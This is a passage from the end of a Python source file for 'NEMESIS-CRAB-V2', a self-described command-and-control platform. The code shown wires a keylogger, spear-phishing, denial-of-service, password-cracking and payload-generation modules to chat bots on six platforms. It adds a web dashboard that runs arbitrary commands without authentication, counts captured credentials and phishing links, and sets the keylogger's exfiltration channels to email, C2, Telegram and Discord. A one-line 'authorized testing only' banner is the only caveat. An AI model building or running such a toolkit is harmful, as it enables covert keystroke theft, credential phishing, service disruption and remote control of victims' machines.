            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return self.config.get('webhook_url') is not None
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str):
        try:
            data = {'text': text[:4000]}
            headers = {'Content-Type': 'application/json'}
            response = requests.post(self.config['webhook_url'], json=data, headers=headers, timeout=10)
            return response.status_code == 200
        except:
            return False

# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    def __init__(self, command_handler, db: DatabaseManager, config: ConfigManager):
        self.handler = command_handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        TEMPLATE = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>🦀 NEMESIS-CRAB-V2 - Cybersecurity Dashboard</title>
            <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Courier New', monospace;
                    background: linear-gradient(135deg, #0a0a2e 0%, #1a1a3e 25%, #2d1b69 50%, #1a1a3e 75%, #0a0a2e 100%);
                    color: #fff;
                    min-height: 100vh;
                }
                .header {
                    background: linear-gradient(135deg, #1a1a3e 0%, #6a0dad 25%, #ff6b35 50%, #6a0dad 75%, #1a1a3e 100%);
                    padding: 20px;
                    text-align: center;
                    border-bottom: 2px solid #ff6b35;
                }
                .header h1 {
                    font-size: 2.8em;
                    background: linear-gradient(135deg, #4fc3f7, #ff8a65, #ce93d8);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                    letter-spacing: 4px;
                }
                .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                    gap: 15px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    background: rgba(255,255,255,0.05);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 10px;
                    padding: 20px;
                    text-align: center;
                }
                .stat-card h3 {
                    font-size: 2em;
                    background: linear-gradient(135deg, #4fc3f7, #ff8a65);
                    -webkit-background-clip: text;
                    -webkit-text-fill-color: transparent;
                }
                .section {
                    background: rgba(255,255,255,0.05);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 10px;
                    padding: 20px;
                    margin-bottom: 20px;
                }
                .section h2 {
                    margin-bottom: 15px;
                    border-bottom: 1px solid rgba(255,255,255,0.1);
                    padding-bottom: 10px;
                }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
                th { color: #4fc3f7; }
                .command-input {
                    width: 100%;
                    padding: 15px;
                    background: rgba(0,0,0,0.3);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 8px;
                    color: #fff;
                    font-size: 16px;
                    margin-bottom: 10px;
                }
                button {
                    background: linear-gradient(135deg, #4fc3f7, #ff6b35);
                    color: white;
                    border: none;
                    padding: 12px 30px;
                    border-radius: 8px;
                    cursor: pointer;
                    font-size: 16px;
                }
                .output {
                    background: rgba(0,0,0,0.3);
                    border: 1px solid rgba(255,255,255,0.1);
                    border-radius: 8px;
                    padding: 15px;
                    font-family: monospace;
                    margin-top: 15px;
                    white-space: pre-wrap;
                    max-height: 400px;
                    overflow-y: auto;
                }
                .status-badge {
                    display: inline-block;
                    padding: 4px 12px;
                    border-radius: 20px;
                    font-size: 12px;
                }
                .severity-critical { background: rgba(244, 67, 54, 0.3); color: #f44336; }
                .severity-high { background: rgba(255, 152, 0, 0.3); color: #ff9800; }
                .severity-medium { background: rgba(255, 193, 7, 0.3); color: #ffc107; }
                .severity-low { background: rgba(76, 175, 80, 0.3); color: #4caf50; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🦀 NEMESIS-CRAB-V2</h1>
                <p>Ultimate Cybersecurity Command & Control Platform</p>
            </div>
            <div class="container">
                <div class="stats-grid" id="stats">
                    <div class="stat-card"><h3 id="statCommands">0</h3><p>Commands</p></div>
                    <div class="stat-card"><h3 id="statThreats">0</h3><p>Threats</p></div>
                    <div class="stat-card"><h3 id="statBlocked">0</h3><p>Blocked IPs</p></div>
                    <div class="stat-card"><h3 id="statCreds">0</h3><p>Credentials</p></div>
                    <div class="stat-card"><h3 id="statPhish">0</h3><p>Phishing Links</p></div>
                </div>
                
                <div class="section">
                    <h2>🚀 Command Center</h2>
                    <div style="display:flex; gap:10px;">
                        <input type="text" id="command" class="command-input" placeholder="Enter command..." style="flex:1;">
                        <button onclick="executeCommand()">EXECUTE</button>
                    </div>
                    <div id="command-output" class="output">
                        <span style="color:#4fc3f7;">system></span> Ready for commands...
                    </div>
                </div>
                
                <div class="section">
                    <h2>📊 Recent Threats</h2>
                    <table>
                        <thead><tr><th>TIME</th><th>TYPE</th><th>SOURCE IP</th><th>SEVERITY</th></tr></thead>
                        <tbody id="threats-table"></tbody>
                    </table>
                </div>
            </div>
            <script>
                var socket = io();
                function executeCommand() {
                    var command = document.getElementById('command').value;
                    if (command) {
                        fetch('/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ command: command })
                        })
                        .then(response => response.json())
                        .then(data => {
                            var outputDiv = document.getElementById('command-output');
                            if (data.success) {
                                outputDiv.innerHTML = '<span style="color:#4fc3f7;">$></span> ' + command + '<br><span style="color:#4fc3f7;">output></span><br>' + data.output + '<br><span style="color:#4fc3f7;">time></span> ' + data.execution_time + 's';
                            } else {
                                outputDiv.innerHTML = '<span style="color:#f44336;">error></span> ' + data.error;
                            }
                        });
                    }
                }
                function loadStats() {
                    fetch('/api/stats')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('statCommands').textContent = data.total_commands || 0;
                            document.getElementById('statThreats').textContent = data.total_threats || 0;
                            document.getElementById('statBlocked').textContent = data.blocked_ips || 0;
                            document.getElementById('statCreds').textContent = data.captured_credentials || 0;
                            document.getElementById('statPhish').textContent = data.total_phishing_links || 0;
                        });
                }
                function loadThreats() {
                    fetch('/api/threats')
                        .then(response => response.json())
                        .then(data => {
                            var html = '';
                            data.threats.forEach(function(threat) {
                                var severityClass = 'severity-' + threat.severity;
                                html += '<tr><td>' + threat.timestamp + '</td><td>' + threat.threat_type + '</td><td>' + threat.source_ip + '</td><td><span class="status-badge ' + severityClass + '">' + threat.severity.toUpperCase() + '</span></td></tr>';
                            });
                            document.getElementById('threats-table').innerHTML = html;
                        });
                }
                loadStats();
                loadThreats();
                setInterval(loadStats, 5000);
                setInterval(loadThreats, 5000);
            </script>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            return jsonify(self.db.get_statistics())
        
        @app.route('/api/threats')
        def api_threats():
            return jsonify({'threats': self.db.get_recent_threats(20)})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# MAIN APPLICATION
# =====================
class NemesisCrabV2:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.nikto = NiktoScanner(self.db)
        self.dos = DOSEngine(self.db, self.config)
        self.spear = SpearPhishingEngine(self.db, self.config)
        self.keylogger = KeyloggerModule(self.db, self.config) if KEYLOGGER_AVAILABLE else None
        self.domain_hosting = DomainHostingEngine(self.db, self.config)
        self.cracking = CrackingEngine(self.db, self.config)
        self.docker_scanner = DockerScanner(self.db)
        self.re_tools = ReverseEngineeringTools(self.db, self.config)
        self.payload_gen = PayloadGenerator(self.db, self.config)
        self.report_gen = ReportGenerator(self.db, self.config)
        
        # Platform bots
        self.discord = DiscordBot(None, self.db)
        self.telegram = TelegramBot(None, self.db)
        self.slack = SlackBot(None, self.db)
        self.signal = SignalBot(None, self.db)
        self.whatsapp = WhatsAppBot(None, self.db)
        self.google_chat = GoogleChatBot(None, self.db)
        
        # Set up handler
        self.handler = CommandHandler(
            self.db, self.config, self.ssh, self.traffic,
            self.nikto, self.dos, self.spear, self.keylogger,
            self.domain_hosting, self.cracking, self.docker_scanner,
            self.re_tools, self.payload_gen, self.report_gen
        )
        
        # Connect bots to handler
        self.discord.handler = self.handler
        self.telegram.handler = self.handler
        self.slack.handler = self.handler
        self.signal.handler = self.handler
        self.whatsapp.handler = self.handler
        self.google_chat.handler = self.handler
        
        # Connect keylogger to bots
        if self.keylogger:
            self.keylogger.telegram_bot = self.telegram
            self.keylogger.discord_bot = self.discord
        
        self.web = WebDashboard(self.handler, self.db, self.config)
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.BLUE}        🦀 NEMESIS-CRAB-V2 v2.0.0   Cybercurity         {Colors.PURPLE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ORANGE}                                                                           {Colors.PURPLE}║
║{Colors.BLUE}  • 🦀 210+ Security Commands             • 📡 Ping / Nmap / Curl / Wget   {Colors.PURPLE}║
║{Colors.BLUE}  • 🔌 SSH Remote Command Execution         • 🚀 REAL Traffic Generation     {Colors.PURPLE}║
║{Colors.BLUE}  • 🕷️ Nikto Web Vulnerability Scanner       • 🎣 100+ Phishing Templates     {Colors.PURPLE}║
║{Colors.BLUE}  • ⌨️ Advanced Keylogger (F10)              • 💥 DOS Attack Capabilities     {Colors.PURPLE}║
║{Colors.BLUE}  • 📧 Spear Phishing Campaigns             • 🤖 Agent Command & Control     {Colors.PURPLE}║
║{Colors.BLUE}  • 📱 Multi-Platform Bot Integration       • 💻 Web Dashboard               {Colors.PURPLE}║
║{Colors.BLUE}  • Discord | Telegram | Slack              • Signal | WhatsApp | Google Chat {Colors.PURPLE}║
║{Colors.BLUE}  • 🔒 IP Management & Threat Detection      • 🌐 Domain Translation          {Colors.PURPLE}║
║{Colors.BLUE}  • 🔓 Password Cracking Engine             • 🐳 Docker Security Scanning    {Colors.PURPLE}║
║{Colors.BLUE}  • 🔬 Reverse Engineering Tools            • 📦 Payload Generation           {Colors.PURPLE}║
║{Colors.BLUE}  • 📊 PDF/JSON Reports                     • 🌐 All Traceroute Commands     {Colors.PURPLE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ORANGE}                    🎯 FOR AUTHORIZED SECURITY TESTING ONLY                    {Colors.PURPLE}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.ORANGE}🦀 Welcome to NEMESIS-CRAB-V2 - Your Ultimate Security Assistant{Colors.RESET}
{Colors.ORANGE}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.ORANGE}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.ORANGE}⌨️ Press F10 to start/stop keylogger{Colors.RESET}
{Colors.ORANGE}🎣 100+ Phishing Templates Available{Colors.RESET}
{Colors.ORANGE}🔬 Reverse Engineering Tools Included{Colors.RESET}
"""
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PURPLE}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'wget', 'nc', 'dig', 'traceroute', 'ssh', 'whois', 'nikto', 'docker']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.BLUE}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.ORANGE}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.BLUE}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.ORANGE}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.ORANGE}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.ORANGE}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.ORANGE}⚠️ telethon not found - Telegram disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.ORANGE}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.ORANGE}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ pynput{Colors.RESET}" if KEYLOGGER_AVAILABLE else f"{Colors.ORANGE}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.BLUE}✅ dnspython{Colors.RESET}" if DNS_AVAILABLE else f"{Colors.ORANGE}⚠️ dnspython not found - DNS features limited{Colors.RESET}")
        print(f"{Colors.BLUE}✅ selenium{Colors.RESET}" if SELENIUM_AVAILABLE else f"{Colors.ORANGE}⚠️ selenium not found - WhatsApp disabled{Colors.RESET}")
        
        if self.nikto.available:
            print(f"{Colors.BLUE}✅ nikto{Colors.RESET}")
        else:
            print(f"{Colors.ORANGE}⚠️ nikto not found - web scanning disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.PURPLE}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ORANGE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ORANGE}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.discord.save_config(token, True, prefix)
                if self.discord.setup():
                    self.discord.start()
                    print(f"{Colors.BLUE}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ORANGE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ORANGE}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.ORANGE}Enter chat ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if token:
                self.telegram.save_config(token, chat_id, True, prefix)
                self.telegram.start()
                print(f"{Colors.BLUE}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.ORANGE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ORANGE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ORANGE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ORANGE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.slack.save_config(token, channel, True, prefix)
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.BLUE}✅ Slack bot starting...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.ORANGE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ORANGE}Enter phone number: {Colors.RESET}").strip()
            group = input(f"{Colors.ORANGE}Enter group ID (optional): {Colors.RESET}").strip()
            if phone:
                self.signal.save_config(phone, group, True, '!')
                self.signal.start()
                print(f"{Colors.BLUE}✅ Signal bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.ORANGE}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ORANGE}Enter WhatsApp phone number: {Colors.RESET}").strip()
            if phone:
                self.whatsapp.save_config(phone, True, '!')
                self.whatsapp.start()
                print(f"{Colors.BLUE}✅ WhatsApp bot starting...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.ORANGE}Configure Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.ORANGE}Enter Google Chat webhook URL: {Colors.RESET}").strip()
            if webhook:
                self.google_chat.save_config(webhook, "", True, '/')
                self.google_chat.start()
                print(f"{Colors.BLUE}✅ Google Chat bot configured...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.ORANGE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.ORANGE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            host = input(f"{Colors.ORANGE}Enter host (default: 0.0.0.0): {Colors.RESET}").strip() or '0.0.0.0'
            self.config.set('web.enabled', True)
            self.config.set('web.port', int(port))
            self.config.set('web.host', host)
            self.config.save()
            self.web.start()
            print(f"{Colors.BLUE}✅ Web dashboard starting...{Colors.RESET}")
        
        # Keylogger
        setup = input(f"{Colors.ORANGE}Enable keylogger? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            if self.keylogger:
                self.config.set('keylogger.enabled', True)
                self.config.set('keylogger.exfil_methods', ['file', 'email', 'c2', 'telegram', 'discord'])
                self.config.save()
                print(f"{Colors.BLUE}✅ Keylogger configured. Press F10 to start/stop.{Colors.RESET}")
            else:
                print(f"{Colors.ORANGE}⚠️ Keylogger not available (pynput missing){Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        setup_platforms = input(f"\n{Colors.ORANGE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        print(f"\n{Colors.BLUE}✅ NEMESIS-CRAB-V2 ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.ORANGE}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.ORANGE}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.ORANGE}   🎣 100+ Phishing Templates Available{Colors.RESET}")
        print(f"{Colors.ORANGE}   🔬 Reverse Engineering Tools Included{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PURPLE}[{Colors.BLUE}{self.session_id}{Colors.PURPLE}]{Colors.ORANGE} 🦀> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.ORANGE}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.BLUE}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.RED}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.ORANGE}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.db.close()
        print(f"\n{Colors.BLUE}✅ Shutdown complete.{Colors.RESET}")

def main():
    try:
        print(f"{Colors.PURPLE}🦀 Starting NEMESIS-CRAB-V2...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.RED}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        
        if needs_admin:
            print(f"{Colors.ORANGE}⚠️ Run with sudo/admin for full functionality{Colors.RESET}")
        
        app = NemesisCrabV2()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.ORANGE}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
